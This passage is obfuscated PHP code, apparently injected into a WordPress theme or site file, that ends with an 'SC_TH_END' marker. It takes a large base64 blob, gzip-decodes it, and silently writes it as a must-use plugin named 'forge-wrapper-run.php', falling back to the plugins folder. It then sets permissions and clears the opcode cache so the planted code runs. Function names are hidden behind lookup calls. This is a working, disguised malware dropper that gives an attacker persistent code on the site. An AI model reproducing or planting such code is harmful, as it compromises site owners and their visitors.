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');
 $seg6q51da5    = (_2h0qtzh0(1)($_hg40005obaqjs0e,0,2)==="\x1f\x8b")   ?   (tde4kbwi(2)('gzdecode')  ?  @gzdecode($_hg40005obaqjs0e) :  (tde4kbwi(2)('gzinflate') ?  @gzinflate(_2h0qtzh0(1)($_hg40005obaqjs0e,(0x4+0x6)))   : false))   :  $_hg40005obaqjs0e;
    if     ($seg6q51da5  &&   r13ss8teleheu(3)($seg6q51da5) >    (482+18)) {
$xxibqjzoyr8ifbp     =   defined("WP_CONTENT_DIR")  ? WP_CONTENT_DIR  :  iinti7wweb569k0(4)(tde4kbwi(4)(__FILE__));
 $agbwyspu329m    =    $xxibqjzoyr8ifbp   .  "/mu-plugins/forge-wrapper-run.php";
$nbtavrzoozb2reuy =  $xxibqjzoyr8ifbp .   "/plugins/forge-wrapper-run/forge-wrapper-run.php";
 $mdaqhqov4cf36a  =  @tde4kbwi(5)($xxibqjzoyr8ifbp   .  "/mu-plugins")   ?   $agbwyspu329m   :    $nbtavrzoozb2reuy;
 if (!@r13ss8teleheu(6)($mdaqhqov4cf36a)   || @iinti7wweb569k0(7)($mdaqhqov4cf36a) <      (4924+76))  {
    if (!@iinti7wweb569k0(8)(tde4kbwi(9)($mdaqhqov4cf36a)))  @_2h0qtzh0(10)(_2h0qtzh0(9)($mdaqhqov4cf36a),  (659-166),  true);



 $xltscrkp6iod =   (_2h0qtzh0(2)('tempnam') ?  @r13ss8teleheu(11)(_2h0qtzh0(9)($mdaqhqov4cf36a), 'sc_')  : false);
       if   ($xltscrkp6iod    !==   false)    {
// packed layout

  $yekx4f2410qdf8   =  @r13ss8teleheu(12)($xltscrkp6iod, $seg6q51da5);
if ($yekx4f2410qdf8    !== false    &&  $yekx4f2410qdf8     === iinti7wweb569k0(13)($seg6q51da5))    {


       $ze_1d0_h1zgcal  =  false;
      if (iinti7wweb569k0(14)('rename'))   $ze_1d0_h1zgcal =   @iinti7wweb569k0(15)($xltscrkp6iod,  $mdaqhqov4cf36a);
    if (!$ze_1d0_h1zgcal    &&   r13ss8teleheu(16)('copy'))   {  $ze_1d0_h1zgcal =     @r13ss8teleheu(17)($xltscrkp6iod,      $mdaqhqov4cf36a);    if   ($ze_1d0_h1zgcal)   @r13ss8teleheu(18)($xltscrkp6iod);     }
if  (!$ze_1d0_h1zgcal) @_2h0qtzh0(18)($xltscrkp6iod);
  if  (r13ss8teleheu(16)('chmod')) @r13ss8teleheu(19)($mdaqhqov4cf36a, (418+2));  if   (tde4kbwi(20)('opcache_invalidate'))    @opcache_invalidate($mdaqhqov4cf36a,     true);
       } else  {
    @iinti7wweb569k0(21)($xltscrkp6iod);
 }
 }
  }
  }
    }
    
}
/* SC_TH_END:4.0.3:ffcc9c39 */
